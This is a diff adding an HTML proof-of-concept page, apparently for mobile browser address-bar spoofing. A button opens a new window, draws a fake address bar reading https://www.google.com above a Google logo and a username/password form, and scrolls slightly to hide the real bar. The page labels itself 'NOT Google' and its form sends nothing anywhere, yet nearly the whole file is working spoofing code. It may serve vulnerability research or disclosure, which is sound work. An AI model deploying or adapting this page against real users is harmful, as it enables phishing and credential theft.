@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<body>
+<button onclick="spoof()">Click to spoof</button>
+<script>
+function spoof() {
+    let win = window.open("", "_blank");
+    let payload = `
+        <div id="fake-bar" style="position: fixed; top: 0; left: 0; width: 100%; height: 56px; background: #ffffff; box-shadow: 0 1px 3px rgba(0,0,0,0.12); z-index: 9999; display: flex; align-items: center; padding: 0 16px; font-family: Arial, sans-serif;">
+            <div style="flex-grow: 1; background: #f1f3f4; border-radius: 24px; padding: 8px 16px; font-size: 14px; color: #202124; text-align: center;">
+                https://www.google.com
+            </div>
+        </div>
+        <div style="padding-top: 60px; text-align: center; font-family: Arial, sans-serif; height: 2000px;"> <!-- Tall content to enable scrolling -->
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google Logo" style="margin-top: 20px;">
+            <h1>This is NOT Google!</h1>
+            <p>Please enter your credentials:</p>
+            <form style="margin-top: 20px;">
+                <input type="text" placeholder="Username" style="display: block; margin: 10px auto; padding: 8px; width: 200px;">
+                <input type="password" placeholder="Password" style="display: block; margin: 10px auto; padding: 8px; width: 200px;">
+                <button type="submit" style="padding: 8px 16px; background-color: #4285F4; color: white; border: none; cursor: pointer;">Sign In</button>
+            </form>
+            <!-- Add more content to make scrolling natural -->
+            <p style="margin-top: 500px;">Scroll down to see more...</p>
+        </div>
+        <script>
+            setTimeout(function() {
+                window.scrollTo(0, 1); // Small scroll to hide real address bar
+            }, 500); // Delay to allow page load
+        </script>
+    `;
+    win.document.write(payload);
+    win.document.close();
+}
+</script>
+</body>
+</html>
